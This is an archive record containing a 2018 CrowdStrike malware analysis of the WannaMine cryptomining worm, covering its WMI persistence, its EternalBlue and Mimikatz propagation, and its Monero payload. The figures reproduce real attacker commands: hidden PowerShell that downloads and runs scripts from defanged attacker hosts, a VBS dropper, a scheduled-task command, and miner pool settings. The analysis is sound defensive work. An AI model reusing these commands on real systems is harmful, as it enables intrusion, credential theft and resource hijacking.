{
    "id": "6610f1a3-ccf4-47b8-8b59-3ab544ba236c",
    "created_at": "2023-01-12T15:10:01.95751Z",
    "updated_at": "2025-03-27T02:08:23.166508Z",
    "deleted_at": null,
    "sha1_hash": "33f1a161587c02b14c46caad2b1de72d02df1628",
    "title": "2018-01-25 - WannaMine Cryptomining- Harmless Nuisance or Disruptive Threat-",
    "authors": "",
    "file_creation_date": "2022-05-28T15:48:18Z",
    "file_modification_date": "2022-05-28T15:48:18Z",
    "file_size": 1135743,
    "plain_text": "# Harmless Nuisance or Disruptive Threat?\n\n**crowdstrike.com/blog/cryptomining-harmless-nuisance-disruptive-threat/**\n\n## WannaMine Cryptomining: Harmless Nuisance or Disruptive Threat?\n\nJanuary 25, 2018\n\n[Ryan McCombs, Jason Barnes, Karan Sood, and Ian Barton](https://www.crowdstrike.com/blog/author/rmcc-jb-ks/) [From The Front Lines](https://www.crowdstrike.com/blog/category/from-the-front-lines/)\n\n\nJanuary 25, 2018\n\n\nCryptocurrencies are in high demand. The usage and monetary value of Bitcoin, Litecoin, Ethereum, and many\nothers have skyrocketed worldwide. The increase in purchasing power and liquidity is driving valuations, as well as\nvolatility, higher than ever before. Naturally, where there are profits to be had, crime is not far behind.\nCybercriminals have honed in on a highly profitable opportunity, using a distributed computing process for\nproduction of cryptocurrency — a process known as “mining.”\n\nCryptocurrency mining is a resource-intensive process of authenticating transactions in return for a cryptocurrency\nreward. While mining itself is legal, fraudulently compromising systems to do the work is not. In recent months,\nCrowdStrike® has noticed an uptick in cyberattacks focused on cryptocurrency-mining tools that commandeer\navailable CPU cycles, without authorization, to make money. While cryptocurrency mining has typically been\nviewed as a nuisance, CrowdStrike has recently seen several cases where mining has impacted business\noperations, rendering some companies unable to operate for days and weeks at a time. The tools have caused\nsystems and applications to crash due to such high CPU utilization speeds. Furthermore, CrowdStrike has\nobserved more sophisticated capabilities built into a cryptomining worm dubbed WannaMine. This tool leverages\npersistence mechanisms and propagation techniques similar to those used by nation-state actors, demonstrating a\n[trend highlighted in the recent CrowdStrike Cyber Intrusion Services Casebook 2017, which states that](https://www.crowdstrike.com/resources/reports/cyber-intrusion-services-casebook/)\n“contemporary attacks continue to blur the lines between nation-state and eCrime tactics.”\n\nWannaMine employs “living off the land” techniques such as Windows Management Instrumentation (WMI)\npermanent event subscriptions as a persistence mechanism. It also propagates via the EternalBlue exploit\npopularized by WannaCry. Its fileless nature and use of legitimate system software such as WMI and PowerShell\nmake it difficult, if not impossible, for organizations to block it without some form of next-generation antivirus.\n\n[WannaMine, first reported by PandaSecurity, is a](https://www.pandasecurity.com/mediacenter/pandalabs/threat-hunting-fileless-attacks/) [Monero cryptocurrency miner that hijacks a system’s CPU cycles](https://getmonero.org/)\nto mine. This fileless malware leverages advanced tactics and techniques to maintain persistence within a network\nand move laterally from system to system. First, WannaMine uses credentials acquired with the credential harvester\n\n\n-----\n\nMimikatz to attempt to propagate and move laterally with legitimate credentials. If unsuccessful, WannaMine\nattempts to exploit the remote system with the EternalBlue exploit used by WannaCry in early 2017.\n\nIn one case, a client informed CrowdStrike that nearly 100 percent of its environment was rendered unusable due\n[to overutilization of systems’ CPUs. Upon deployment of the CrowdStrike Falcon® endpoint protection platform,](https://www.crowdstrike.com/endpoint-security-products/falcon-platform/)\nwith default prevention capabilities, the client restored 80 percent of its operational capability. With script blocking\nenabled, the client achieved 95 percent operational capability within a couple of hours. Figure 1 below\ndemonstrates the impact Falcon with script blocking had by immediately blocking the WannaMine activity. This\nfigure shows all suspicious detection activities across the client’s enterprise, and the significant decline in critical\ndetections due to blocked execution of WannaMine features via Falcon script blocking.\n\nFigure 1\n\nUpon deployment of the Falcon platform, CrowdStrike identified the tell-tale execution signs of WannaMine.\nSnippets of exploit code are shown in Figures 2 and 3, and the scheduled task is shown in Figure 4.\n```\npowershell.exe -NoP -NonI -W Hidden -E\nJABzAHQAaQBtAGUAPQBbAEUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgBUAGkAYwBrAEMAbwB1AG4AdAANAA…\n\n```\nFigure 2. Truncated base64-encoded PowerShell command\n```\ncmd /v:on /c for /f \"tokens=2 delims=.[\" %i in ('ver') do (set a=%i)&if !a:~-1!==5 (@echo on\nerror resume next>%windir%\\11.vbs&@echo Set\nox=CreateObject^(\"MSXML2.XMLHTTP\"^)>>%windir%\\11.vbs&@echo ox.open\n\"GET\",\"http[:]//118.184.48[.]95:8000/info.vbs\",false>>%windir%\\11.vbs&@echo\nox.setRequestHeader \"User-Agent\", \"-\">>%windir%\\11.vbs&@echo\nox.send^(^)>>%windir%\\11.vbs&@echo If ox.Status=200 Then>>%windir%\\11.vbs&@echo Set\noas=CreateObject^(\"ADODB.Stream\"^)>>%windir%\\11.vbs&@echo oas.Open>>%windir%\\11.vbs&@echo\noas.Type=1 >>%windir%\\11.vbs&@echo oas.Write ox.ResponseBody>>%windir%\\11.vbs&@echo\noas.SaveToFile \"%windir%\\info.vbs\",2 >>%windir%\\11.vbs&@echo oas.Close>>%windir%\\11.vbs&@echo\nEnd if>>%windir%\\11.vbs&@echo Set os=CreateObject^(\"WScript.Shell\"^)>>%windir%\\11.vbs&@echo\nos.Exec^(\"cscript.exe %windir%\\info.vbs\"^)>>%windir%\\11.vbs&cscript.exe %windir%\\11.vbs) else\n(powershell -NoP -NonI -W Hidden \"if((Get-WmiObject\nWin32_OperatingSystem).osarchitecture.contains('64')){IEX(New-Object\nNet.WebClient).DownloadString('http[:]//118.184.48[.]95:8000/info6.ps1')}else{IEX(New-Object\nNet.WebClient).DownloadString('http[:]//118.184.48[.]95:8000/info3.ps1')}\")\n\n```\n\n-----\n\nFigure 3\n```\ncmd /c echo powershell -nop \"$a=([string](Get-WMIObject -Namespace root\\Subscription -Class\n__FilterToConsumerBinding ));if(($a -eq $null) -or (!($a.contains('SCM Event Filter'))))\n{IEX(New-Object\nNet.WebClient).DownloadString('http[:]//stafftest.spdns[.]eu:8000/mate6.ps1')}\" >%temp%\\y1.bat\n&& SCHTASKS /create /RU System /SC DAILY /TN yastcat /f /TR \"%temp%\\y1.bat\" &&SCHTASKS /run\n/TN yastcat<c/ode>\n\n```\nFigure 4\n\nThis blog will touch on the files downloaded in Figures 3 and 4 later, but first, let’s address WannaMine’s WMI\nfeatures.\n\nStarting with analyzing the base64 -decoded output from Figure 2, we can see reference to many WMI class\nfunctions – none of which look legitimate at first glance.\n```\n…\n$funs = ([WmiClass] 'root\\default:Win32_TaskService').Properties['funs'].Value\n…\nGet-WmiObject __FilterToConsumerBinding -Namespace root\\subscription | Where-Object {$_.filter\n-notmatch 'SCM Event'} |Remove-WmiObject\n…\n$cmdmon=\"powershell -NoP -NonI -W Hidden `\"`$mon = ([WmiClass]\n'root\\default:Win32_TaskService').Properties['mon'].Value;`$funs = ([WmiClass]\n'root\\default:Win32_TaskService').Properties['funs'].Value ;iex\n([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(`$funs)));InvokeCommand -ScriptBlock `$RemoteScriptBlock -ArgumentList @(`$mon, `$mon, 'Void', 0, '', '')`\"\"\n…\n$mimi = ([WmiClass] 'root\\default:Win32_TaskService').Properties['mimi'].Value\n…\n$ipsu = ([WmiClass] 'root\\default:Win32_TaskService').Properties['ipsu'].Value\n$i17 = ([WmiClass] 'root\\default:Win32_TaskService').Properties['i17'].Value\n$scba= ([WmiClass] 'root\\default:Win32_TaskService').Properties['sc'].Value\n…\n\n```\nFigure 5\n\nIn a [previous blog, CrowdStrike highlighted the use of WmiClass, a type of accelerator for ManagementClass, or a](https://www.crowdstrike.com/blog/bear-hunting-tracking-cozybear-backdoors/)\nshortcut to a WMI class definition. In this instance, the functions residing within the Win32_TaskService WMI class\nlook legitimate at first glance, because the class has a similar naming convention to other WMI classes. However,\nby querying the above definitions in that class, we can see it is not legitimate. Descriptions of the contents of the\nproperties can be seen in the table below.\n\n\n**Win32_TaskService**\n**Property**\n\n\n**Function**\n\n\n**mon** Monero CPU miner\n\n**mimi** Mimikatz credential harvesting tool\n\n**funs** Combination of publicly available scripts to achieve remote DLL loading via WMI and\nobfuscated EternalBlue\n\n**i17** Targeting\n\n**ipsu** Targeting\n\n**sc** yastcat Scheduled Task configuration\n\n\n-----\n\nJust to make sure we ve identified all the functions within this class, we ll query all the contents of the class and see\nthat there are two additional functions, “vcp” and “vcr.” These two functions correspond to two Visual C++\nredistributable DLL files, msvcp120.dll and msvcr120.dll. This shows that the malware chooses not to rely on the\nimpacted system for dependencies and will bring along all code needed to function properly.\n\nThe clear takeaway from analysis of this malicious WMI class is that WannaMine is leveraging the WMI repository\nto store code for execution. So how is the code in Figure 1 executing?\n\nLet’s start by considering y1.bat, identified in the scheduled task shown in Figure 4.\n```\npowershell -nop \"$a=([string](Get-WMIObject -Namespace root\\Subscription -Class\n__FilterToConsumerBinding ));if(($a -eq $null) -or (!($a.contains('SCM Event Filter'))))\n{IEX(New-Object\nNet.WebClient).DownloadString('http[:]//stafftest.spdns[.]eu:8000/mate6.ps1')}\"\n\n```\nFigure 6. Contents of y1.bat\n\nThis is not extremely helpful to our understanding of the attack, as it’s only performing the download functionality.\nBut this is not the first time we’ve seen a check being performed for “SCM Event Filter” within WMI Filter to\nConsumer Bindings (see Figure 2 above). Let’s check into permanent event subscriptions, since WannaMine\nnamed the malicious WMI class to blend in.\n\nFigure 7\n\nSure enough, WannaMine is leveraging permanent event subscriptions to maintain persistence. This permanent\nevent subscription is set to execute the PowerShell command located in the Event Consumer every 90 minutes, per\nthe Event Filter.\n\nLet’s circle back to the files downloaded in Figures 3 and 4. The batch script in Figure 3 first checks the Windows\nversion of the system it is running on by issuing the command “CMD /V:ON /C”. If the Windows Version is 5, in\nother words if the current system is running either Windows 2000, Windows XP, Windows XP 64-Bit, Windows\nServer 2003, or Windows Server 2003 R2, the script will drop a file named 11.vbs in C:\\Windows. The following are\nthe contents of the script:\n\n```\nOX.SETREQUESTHEADER \"USER-AGENT\", \"-\"\n\n```\n```\nOAS.CLOSE\n\n```\n\n-----\n\n```\nEND IF\nSET OS=CREATEOBJECT(\"WSCRIPT.SHELL\")\nOS.EXEC(\"CSCRIPT.EXE C:\\Windows\\INFO.VBS\")\n\n```\nFigure 8\n\nThis script is responsible for calling out to stafftest.firewall-gateway[.]com to download another vbs file named\ninfo.vbs, saving it in C:\\Windows and then executing it via cscript.exe. It should be noted that CrowdStrike analysts\nalso analyzed info.vbs, which is downloaded by the original batch script. The following is a snippet of the\ndeobfuscated file:\n```\nSub WriteBinary(FileName, Buf)\nConst adTypeBinary = 1\n Const adSaveCreateOverWrite = 2\n Dim stream, xmldom, node\n Set xmldom = CreateObject(\"Microsoft.XMLDOM\")\n Set node = xmldom.CreateElement(\"binary\")\n node.DataType = \"bin.base64\"\n\n```\n```\nnode.Text = Buf\n\n```\n```\nstream.Type = adTypeBinary\n\n```\n```\nstream.Close\n\n```\n\nFigure 9\n\nThe file decodes a base64-encoded binary embedded within itself, saves it in the %TEMP% folder and executes it\nwith the following (sanitized) command line:\n```\n-B -o stratum+tcp://pool.supportxmr[.]com:80 u 46CJt5F7qiJiNhAFnSPN1G7BMTftxtpikUjt8QXRFwFH2c3e1h6QdJA5dFYpTXK27dEL9RN3H2vLc6eG2wGahxpBK5zmCuE\n-o stratum+tcp://mine.xmrpool[.]net:80 -u\n46CJt5F7qiJiNhAFnSPN1G7BMTftxtpikUjt8QXRFwFH2c3e1h6QdJA5dFYpTXK27dEL9RN3H2vLc6eG2wGahxpBK5zmCuE\n-o stratum+tcp://pool.minemonero[.]pro:80 -u\n46CJt5F7qiJiNhAFnSPN1G7BMTftxtpikUjt8QXRFwFH2c3e1h6QdJA5dFYpTXK27dEL9RN3H2vLc6eG2wGahxpBK5zmCuE\n-p x\n\n```\nFigure 10\n\nThis is the actual payload responsible for utilizing the victim computer’s CPU cycles to mine Monero cryptocurrency.\nThe following is the information regarding the binary:\n```\nFile: taskservice.exe\nSize: 180736\nMD5: 9AC3BDB9378CD1FAFBB8E08DEF738481\nCompiled: Thu, Aug 31 2017, 13:31:24 - 32 Bit EXE\n\n```\nFigure 11\n\nIf the Windows version is either Windows Vista or above, the batch script will issue the following powershell\ncommand:\n\n\n-----\n\n```\nPOWERSHELL NOP NONI W HIDDEN IF((GET WMIOBJECT\nWIN32_OPERATINGSYSTEM).OSARCHITECTURE.CONTAINS(’64’)){IEX(NEW-OBJECT\nNET.WEBCLIENT).DOWNLOADSTRING(‘HTTP[:]//STAFFTEST.FIREWALLGATEWAY[.]COM:8000/INFO6.PS1′)}ELSE{IEX(NEW-OBJECT\nNET.WEBCLIENT).DOWNLOADSTRING(‘HTTP[:]//STAFFTEST.FIREWALL-GATEWAY[.]COM:8000/INFO3.PS1′)}“)\n\n```\nFigure 12\n\nIf the OS architecture is 64-bit, the script will call out to the aforementioned domain and download info6.ps1,\notherwise it downloads info3.ps1.\n\nRecovering info6.ps1 and mate6.ps1was possible and allowed CrowdStrike to understand how WannaMine was\ncreating the malicious WMI class and subsequent properties. The two files are similar, with minor changes\ndepending on the OS architecture. After decoding the heavily obfuscated info6.ps1, we see the WMI properties\nbeing set in Figure 13.\n```\n$mimi=$fa.substring(0,1131864)\n$mon=$fa.substring(1131866,357720)\n$vcp=$fa.substring(1489588,880172)\n$vcr=$fa.substring(2369762,1284312)\n$funs=$fa.substring(3654076,497360)\n$sc=$fa.substring(4151438)$StaticClass = NewObjectManagement.ManagementClass((('root\\default'),$null,$null)\n$StaticClass.Name=('Win32_TaskService')\n$StaticClass.Put() | Out-Null\n$StaticClass.Properties.Add(('mimi'),$mimi)\n$StaticClass.Put() | Out-Null\n$StaticClass.Properties.Add(('mon'),$mon)\n$StaticClass.Put() | Out-Null\n$StaticClass.Properties.Add(('vcp'),$vcp)\n$StaticClass.Put() | Out-Null\n$StaticClass.Properties.Add(('vcr'),$vcr)\n$StaticClass.Put() | Out-Null\n$StaticClass.Properties.Add(('funs'),$funs)\n$StaticClass.Put() | Out-Null\n$StaticClass.Properties.Add('sc',$sc)\n$StaticClass.Put() | Out-Null\n$StaticClass.Properties.Add(('ipsu'),\"\")\n$StaticClass.Put() | Out-Null\n$StaticClass.Properties.Add(('i17'),\"\")\n$StaticClass.Put() | Out-Null\n\n```\nFigure 13\n\nCrowdStrike anticipates that these threat actors will continue to evolve their capabilities to go undetected. For\nexample, for the writing of this post, CrowdStrike analysts downloaded the current version of info6.ps1 from the\nadversary’s infrastructure. Contained within was similar code to create a malicious WMI class. However, the class\nname was called “Office_Updater” instead of “Win32_TaskService”.\n\n## Conclusion\n\nWhile the tactics, techniques, and procedures (TTPs) displayed in WannaMine did not require a high degree of\nsophistication, the attack clearly stands on the shoulders of more innovative and enterprising nation-state and\neCrime threat actors.\n\nWhatever these threat actors may lack in sophistication, they made up for in resourcefulness: We should appreciate\nthe lengths they went to achieve their goals, and what they learned from the public successes and failures of other\nthreat actors. In doing so, we take a vital step toward promoting a stronger security posture, better controls, and\n\n\n-----\n\nmore disruptive defensive tactics. Companies should focus on beefing up their prevention and detection and\nresponse capabilities to ensure that they are able to detect these TTPs. Improved defenses will become even more\ncritical in 2018 as we expect to see continued convergence of sophisticated statecraft and tradecraft.\n\n## Falcon Endpoint Protection Platform (EPP)\n\nThe prevention features of CrowdStrike Falcon EPP offer ample protection against this threat within your\nenvironment. The redacted screenshot below demonstrates Falcon’s WannaMine prevention in action.\n\nFigure 14\n\nCrowdStrike expects to see much more cryptomining activity in 2018, resulting in business disruptions and\ndowntime that can impact the bottom line. As organizations and companies come to understand how these\ntraditionally unsophisticated actors are using increasingly sophisticated tactics, they can take a vital step toward\npromoting a stronger security posture and avoiding unnecessary interruptions that can affect critical business\nprocesses.\n\n**[Learn more about the CrowdStrike Falcon platform and get full access to CrowdStrike’s next-gen antivirus](https://www.crowdstrike.com/endpoint-security-products/falcon-platform/)**\n[solution for 15 days by visiting the Falcon Prevent free trial page.](https://go.crowdstrike.com/try-falcon-prevent.html)\n\n[Download a white paper: CrowdStrike Falcon: Setting a New Standard in Endpoint Protection](https://www.crowdstrike.com/resources/white-papers/crowdstrike-falcon-setting-the-new-standard-in-endpoint-protection-epp/)\n\nRelated Content\n\n\n-----\n\nCompromised Docker Honeypots Used for Pro-Ukrainian DoS Attack\n\nN i i h Fi S f G i f D i B h\n\n\n-----\n\nLemonDuck Targets Docker for Cryptomining Operations\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-01-25 - WannaMine Cryptomining- Harmless Nuisance or Disruptive Threat-.pdf"
    ],
    "report_names": [
        "2018-01-25 - WannaMine Cryptomining- Harmless Nuisance or Disruptive Threat-.pdf"
    ],
    "threat_actors": [
        {
            "id": "81dde5cc-c29f-430d-8c6e-e5e92d5015e7",
            "created_at": "2022-10-25T16:07:23.704358Z",
            "updated_at": "2025-03-27T02:02:09.932453Z",
            "deleted_at": null,
            "main_name": "Harvester",
            "aliases": [],
            "source_name": "ETDA:Harvester",
            "tools": [
                "Agentemis",
                "Cobalt Strike",
                "CobaltStrike",
                "Graphon",
                "Metasploit",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536201,
    "ts_updated_at": 1743041303,
    "ts_creation_date": 1653752898,
    "ts_modification_date": 1653752898,
    "files": {
        "pdf": "https://archive.orkl.eu/33f1a161587c02b14c46caad2b1de72d02df1628.pdf",
        "text": "https://archive.orkl.eu/33f1a161587c02b14c46caad2b1de72d02df1628.txt",
        "img": "https://archive.orkl.eu/33f1a161587c02b14c46caad2b1de72d02df1628.jpg"
    }
}